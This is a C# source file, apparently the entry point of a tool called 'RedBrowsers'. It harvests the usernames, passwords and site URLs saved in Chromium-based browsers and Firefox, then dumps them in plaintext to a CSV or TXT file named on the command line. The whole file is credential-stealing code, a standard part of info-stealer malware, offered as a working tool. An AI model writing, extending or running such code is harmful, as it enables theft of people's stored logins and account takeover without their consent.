using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using RedBrowsers.Classes;
using static RedBrowsers.Utlis.Utlis;
namespace RedBrowsers
{
     static class Program
    {
        static void Main(string[] args)
        {
            List<Account> a = ChromiumEngine.GetChromium.Grab();
            a.AddRange(Firfox.FirefoxPassReader.ReadPasswords());
            if (!(args.Length == -1))
            {

                switch (args[0].ToUpper())
                {
                    case "CSV":
                        {

                            try  { CreateCSV(a, args[1]); }  catch(Exception ex) {Console.WriteLine(ex.Message);}
                            break;
                        }

                    case "TXT":
                        {
                            string output = "";
                            foreach (Account account in a){output += $"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";}
                            try { File.WriteAllText(args[1],output ); } catch (Exception ex) { Console.WriteLine(ex.Message); }

                            break;
                        }
                    default:
                        {



                            break;

                        }
                }

                }




            }

    }


    }

